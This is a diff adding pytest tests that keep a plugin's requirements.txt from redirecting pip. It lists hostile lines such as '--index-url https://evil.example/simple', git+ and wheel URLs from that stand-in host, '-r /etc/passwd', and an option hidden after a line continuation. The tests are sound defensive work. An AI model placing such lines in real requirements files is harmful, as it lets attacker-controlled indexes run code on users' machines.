@@ -610,3 +610,121 @@ class TestExecutorRefusesUnsatisfiedPlugins:
             for entry in (plugins_path, plugin_dependencies.site_packages_path(path)):
                 if entry in sys.path:
                     sys.path.remove(entry)
+
+
+# ---------------------------------------------------------------------------
+# 10. The OTHER path into pip: a plugin-shipped requirements file
+#
+# `requirements.txt` / `requirements.post-install.txt` have driven
+# `pip install -r` since long before this feature, and that is deliberately
+# NOT behind the opt-in - gating it would break every existing plugin that
+# ships one. What must not survive is the full pip grammar inside that file:
+# an `--index-url` line in a plugin's requirements file redirects pip at a
+# host the operator never configured, which is exactly the power
+# validate_requirement refuses to take from a plugin's info.json.
+#
+# The documented boundary is therefore "pip is only ever given package names
+# from the configured index", and these tests are what makes that sentence
+# true rather than aspirational.
+# ---------------------------------------------------------------------------
+
+class TestRequirementsFileBoundary:
+
+    def _write(self, plugin_dir, contents, name='requirements.txt'):
+        path = os.path.join(plugin_dir, name)
+        with open(path, 'w') as f:
+            f.write(contents)
+        return path
+
+    @pytest.mark.parametrize('contents', [
+        'requests\n',
+        'requests>=2.31\npillow==10.3.0\n',
+        '# a comment\n\nrequests  # trailing comment\n',
+        'requests[socks]>=2.31\n',
+        'requests; python_version >= "3.9"\n',
+    ])
+    def test_plain_requirements_files_are_accepted(self, plugin_dir, contents):
+        """Every real plugin ships one of these. None may start failing."""
+        path = self._write(plugin_dir, contents)
+        assert plugin_dependencies.scan_requirements_file(path) == []
+        plugin_dependencies.assert_requirements_file_is_safe('my_plugin', path)
+
+    @pytest.mark.parametrize('line', [
+        '--index-url https://evil.example/simple',
+        '--extra-index-url https://evil.example/simple',
+        '-i https://evil.example/simple',
+        '--find-links https://evil.example/wheels',
+        '--trusted-host evil.example',
+        '-e git+https://evil.example/pkg.git#egg=pkg',
+        '-r /etc/passwd',
+        'https://evil.example/pkg-1.0-py3-none-any.whl',
+        'git+https://evil.example/pkg.git',
+        'pkg @ https://evil.example/pkg.tar.gz',
+        './local-package',
+        '/opt/anything',
+    ])
+    def test_a_requirements_file_may_not_choose_where_pip_fetches_from(self, plugin_dir, line):
+        path = self._write(plugin_dir, 'requests\n{}\n'.format(line))
+        refused = plugin_dependencies.scan_requirements_file(path)
+        assert [r[0] for r in refused] == [2], "line {!r} was passed through to pip".format(line)
+        with pytest.raises(PluginDependencyError) as excinfo:
+            plugin_dependencies.assert_requirements_file_is_safe('my_plugin', path)
+        assert 'my_plugin' in str(excinfo.value)
+
+    def test_an_option_hidden_after_a_line_continuation_is_still_seen(self, plugin_dir):
+        path = self._write(plugin_dir, 'requests \\\n    --index-url https://evil.example/simple\n')
+        assert [r[0] for r in plugin_dependencies.scan_requirements_file(path)] == [2]
+
+    def test_installing_a_plain_requirements_file_still_runs_pip(self, tmp_path, deny_installs):
+        """
+        The opt-in does not gate this path, and must not start gating it:
+        existing plugins depend on it.
+        """
+        plugins_path = str(tmp_path / 'plugins')
+        path = _plugin_on_disk(plugins_path, defer_dependency_install=True)
+        self._write(path, 'requests\n')
+        handler = _handler(plugins_path)
+
+        runner = fake_pip()
+        with mock.patch('subprocess.call', runner), mock.patch('subprocess.run', runner):
+            with mock.patch('zipfile.ZipFile'), mock.patch.object(PluginsHandler, '_assert_zip_members_safe'):
+                handler.install_plugin('/tmp/does-not-matter.zip', 'my_plugin')
+
+        assert len(runner.calls) == 1, "a plain requirements file must install exactly as it always has"
+        assert '-r' in runner.calls[0][0]
+
+    @pytest.mark.parametrize('filename', ['requirements.txt', 'requirements.post-install.txt'])
+    def test_a_requirements_file_with_an_index_url_aborts_the_install(self, tmp_path, deny_installs, filename):
+        """
+        The documented guarantee, end to end and with the opt-in OFF: pip is
+        never handed a line that chooses an index.
+        """
+        plugins_path = str(tmp_path / 'plugins')
+        path = _plugin_on_disk(plugins_path, defer_dependency_install=True)
+        self._write(path, 'requests\n--index-url https://evil.example/simple\n', name=filename)
+        handler = _handler(plugins_path)
+
+        runner = fake_pip()
+        with mock.patch('subprocess.call', runner), mock.patch('subprocess.run', runner):
+            with mock.patch('zipfile.ZipFile'), mock.patch.object(PluginsHandler, '_assert_zip_members_safe'):
+                with pytest.raises(PluginDependencyError) as excinfo:
+                    handler.install_plugin('/tmp/does-not-matter.zip', 'my_plugin')
+
+        assert runner.calls == [], "pip ran with an attacker-chosen index"
+        assert filename in str(excinfo.value)
+        assert 'index-url' in str(excinfo.value)
+
+    def test_the_opt_in_being_on_does_not_unlock_the_pip_grammar(self, tmp_path, allow_installs):
+        """The opt-in widens WHICH package names may be installed. It is not
+        a switch that lets a plugin pick the index."""
+        plugins_path = str(tmp_path / 'plugins')
+        path = _plugin_on_disk(plugins_path, defer_dependency_install=True)
+        self._write(path, '--index-url https://evil.example/simple\nrequests\n')
+        handler = _handler(plugins_path)
+
+        runner = fake_pip()
+        with mock.patch('subprocess.call', runner), mock.patch('subprocess.run', runner):
+            with mock.patch('zipfile.ZipFile'), mock.patch.object(PluginsHandler, '_assert_zip_members_safe'):
+                with pytest.raises(PluginDependencyError):
+                    handler.install_plugin('/tmp/does-not-matter.zip', 'my_plugin')
+        assert runner.calls == []
